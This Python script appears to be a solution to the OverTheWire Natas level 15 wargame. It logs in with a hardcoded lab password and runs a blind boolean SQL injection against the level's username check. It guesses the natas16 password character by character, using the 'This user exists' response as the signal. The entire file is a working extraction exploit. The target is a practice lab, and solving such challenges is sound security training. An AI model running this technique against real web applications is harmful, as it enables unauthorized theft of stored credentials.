import requests
import string
import re

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url = "http://%s.natas.labs.overthewire.org" % username
s = requests.Session()
r = s.get(url, auth = (username,password))

alphabet = string.ascii_letters + string.digits

discovered_username = ""

def sqli(res, usr, idx):
    for char in alphabet:
        tmp_usr = usr + char
        _ended = True
        payload = {
            "username": f'natas16" and substring(password,1 ,{idx}) = binary \'{tmp_usr}\'-- -'
        }
        r = s.get(url, params=payload, auth=(username, password))
        if re.search("This user exists", r.text):
            _ended = False
            print(f"[+] Current : {tmp_usr}")
            sqli(res, tmp_usr, idx + 1)
            if idx != 1:
                break
    if _ended and usr != '':
        print(f"[+] Found! : {usr}")
        res.append(usr)

usernames = []
sqli(usernames, "", 1)
print(usernames)